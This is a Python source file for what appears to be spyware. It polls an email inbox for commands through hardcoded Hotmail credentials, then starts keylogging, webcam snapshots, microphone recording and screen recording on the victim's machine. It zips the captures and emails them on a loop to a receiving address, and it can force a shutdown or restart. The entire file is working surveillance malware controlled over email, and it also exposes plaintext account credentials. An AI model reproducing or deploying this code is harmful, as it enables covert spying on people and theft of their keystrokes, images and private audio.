import datetime
import glob
import os
import shutil
import smtplib
import threading
import time
import warnings
import zipfile
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests
import cam
import key
import mailread
import screen
import sound
import pyautogui
warnings.filterwarnings("ignore")


def net():
    timeout = 1
    while True:
        try:
            requests.head("http://www.google.com/", timeout=timeout)

            return
        except requests.ConnectionError:
            pass


net()

b = False
wait = 1800
turn = 1
mtxt = 0
mcam = 0
mvrec = 0
msrec = 0
mvrecsec = 10
msrecsec = 10
mshutdown = 0
# ----------------------------
i = 0
if os.path.exists("sends"):
    shutil.rmtree("sends")
if os.path.exists("sends.zip"):
    os.remove("sends.zip")
os.mkdir("sends")
names = "sends/host"
ncam = names + ".jpg"
nvrec = names + ".wav"
nsrec = names + ".avi"
ntxt = names + ".txt"
user = "gotyouhahahaha@hotmail.com"
passw = "Ga1youhahaha."
to = "getfromgot@hotmail.com"
# ----------------------------
frm, subject, body = mailread.mread(user, passw, os.getlogin())

a = time.localtime()
mkey = datetime.date(1900, a.tm_mon, 1).strftime('%B').lower()[2]
subcont = os.getlogin() + "," + mkey + ",wait,turn,txt,cam,vrec,srec,vrecsec,srecsec,shutdown"
if subject == subcont:
    sbody = str(body).split(",")
    try:
        wait, turn, mtxt, mcam, mvrec, msrec, mvrecsec, msrecsec, mshutdown = \
            int(sbody[0]), int(sbody[1]), int(sbody[2]), int(sbody[3]), int(sbody[4]), int(sbody[5]), int(
                sbody[6]), int(sbody[7]), int(sbody[8])
    except:
        None
    b = True
    if mtxt > 0:
        t3 = threading.Thread(target=key.runkey, args=(ntxt, mtxt))  # key
        t3.start()

while b:
    i += 1
    # time
    a = time.localtime()
    sysdate = str(a.tm_mday) + "." + str(a.tm_mon) + "." + str(a.tm_year)
    systime = str(a.tm_hour) + ":" + str(a.tm_min) + ":" + str(a.tm_sec)

    if mcam == 1 and i == 1:
        t1 = threading.Thread(target=cam.cams, args=(ncam,))
        t1.start()
    elif mcam == 2 and i % 2 == 0:
        t1 = threading.Thread(target=cam.cams, args=(ncam,))
        t1.start()
    elif mcam == 3:
        t1 = threading.Thread(target=cam.cams, args=(ncam,))
        t1.start()
    # ----------------------------
    if mvrec == 1 and i == 1:
        t2 = threading.Thread(target=sound.record, args=(nvrec, mvrecsec))
        t2.start()
    elif mvrec == 2 and i % 2 == 0:
        t2 = threading.Thread(target=sound.record, args=(nvrec, mvrecsec))
        t2.start()
    elif mvrec == 3:
        t2 = threading.Thread(target=sound.record, args=(nvrec, mvrecsec))
        t2.start()
    # ----------------------------
    if msrec == 1 and i == 1:
        t4 = threading.Thread(target=screen.screen_rec, args=(nsrec, msrecsec))
        t4.start()
    elif msrec == 2 and i % 2 == 0:
        t4 = threading.Thread(target=screen.screen_rec, args=(nsrec, msrecsec))
        t4.start()
    elif msrec == 3:
        t4 = threading.Thread(target=screen.screen_rec, args=(nsrec, msrecsec))
        t4.start()

    if t1.is_alive():
        t1.join()
    if t2.is_alive():
        t2.join()
    if t4.is_alive():
        t4.join()
        # ----------------------------

    # rar oluşturma
    arsivlenecekDosyalar = []
    for belge in glob.iglob("sends/*", recursive=False):
        arsivlenecekDosyalar.append(belge)
    with zipfile.ZipFile("sends.zip", "w", compression=14) as arsiv:
        for dosya in arsivlenecekDosyalar:
            arsiv.write(dosya)
    # login
    try:
        mail = smtplib.SMTP('smtp-mail.outlook.com', 587)
        mail.ehlo()
        mail.starttls()
        mail.login(user, passw)
    except:
        print("login hata")
    mesaj = MIMEMultipart()
    mesaj["From"] = user
    mesaj["To"] = to
    mesaj["Subject"] = os.getlogin() + " Logged In"

    # ----------------------------
    if os.path.exists("sends.zip"):
        # zip
        part = MIMEBase('application', "octet-stream")
        part.set_payload(open("sends.zip", "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename=' + "sends.zip")
        mesaj.attach(part)

    # tarih
    mesaj.attach(MIMEText(
        '<font size="6" face="verdana" color="grey">' + sysdate +
        '</font><br><br><font size="10" face="calibri" color="blue">' + systime + '</font> ', "html"))
    try:
        mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
    except:
        None
    mail.close()
    if i == turn:
        key.__setattr__('c', 0)
        pyautogui.press("esc")
        b = False
    else:
        time.sleep(wait)

# ----------------------------
try:
    print("1",mshutdown)
    if t3.isAlive():
        t3.join()
    print("2",mshutdown)
    os.remove("sends")
    print("3",mshutdown)
    os.remove("sends.zip")
    print("4",mshutdown)

except:
    print("hata son",mshutdown)

if mshutdown == 1:
    os.system("shutdown /s /t 1")
elif mshutdown == 2:
    os.system("shutdown /r /t 1")
elif mshutdown == 3:
    print("bla")
    os.system("shutdown -l")